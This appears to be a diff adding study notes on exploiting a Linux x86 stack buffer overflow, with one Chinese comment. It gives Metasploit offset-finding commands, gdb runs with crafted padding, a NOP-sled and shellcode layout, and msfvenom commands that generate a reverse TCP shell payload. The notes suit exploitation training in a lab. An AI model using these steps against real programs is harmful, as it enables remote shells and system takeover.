@@ -16,3 +16,16 @@
 MSF:  
   /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt
   /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569(eip address)
+  (gdb) run $(python -c "print '\x55' * 1036 + '\x66' * 4")            为了覆盖它并检查我们是否按计划到达，我们可以在后面添加 4 个字节的“\x66”并执行，以确保我们控制了 EIP
+
+  msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c            shellcode
+
+  Buffer = "\x55" * (1040 - 100 - 150 - 4) = 786
+  NOPs = "\x90" * 100
+  Shellcode = "\x44" * 150
+  EIP = "\x66" * 4
+
+  (gdb) run $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')
+
+  msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode
+  
